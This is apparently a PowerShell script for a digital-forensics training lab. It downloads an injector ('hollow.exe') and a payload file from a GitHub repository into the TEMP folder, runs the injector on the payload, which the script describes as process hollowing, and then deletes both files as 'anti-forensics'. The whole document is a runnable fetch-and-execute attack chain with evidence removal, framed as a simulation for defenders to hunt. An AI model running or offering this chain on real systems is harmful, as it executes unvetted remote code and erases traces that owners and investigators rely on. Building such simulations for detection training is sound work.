# DFIR Lab Simulation Script
# UPDATED REPO LINK:
$repo = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main" 

$hollow_exe = "hollow.exe"
$payload_bin = "payload.bin"
$temp_dir = "$env:TEMP"

Write-Host "[*] Starting Attack Simulation..." -ForegroundColor Green

# 1. Download the Injector and the Payload to Temp
Invoke-WebRequest -Uri "$repo/$hollow_exe" -OutFile "$temp_dir\$hollow_exe"
Invoke-WebRequest -Uri "$repo/$payload_bin" -OutFile "$temp_dir\$payload_bin"

# 2. Execute the Injector
Write-Host "[*] Executing Hollowing Loader..." -ForegroundColor Yellow
Start-Process -FilePath "$temp_dir\$hollow_exe" -ArgumentList "$temp_dir\$payload_bin" -Wait

# 3. Cleanup the Tools (Anti-Forensics)
Write-Host "[*] Cleaning up artifacts..." -ForegroundColor Red
Remove-Item "$temp_dir\$hollow_exe" -Force
Remove-Item "$temp_dir\$payload_bin" -Force

Write-Host "[+] Simulation Complete. Happy Hunting!" -ForegroundColor Green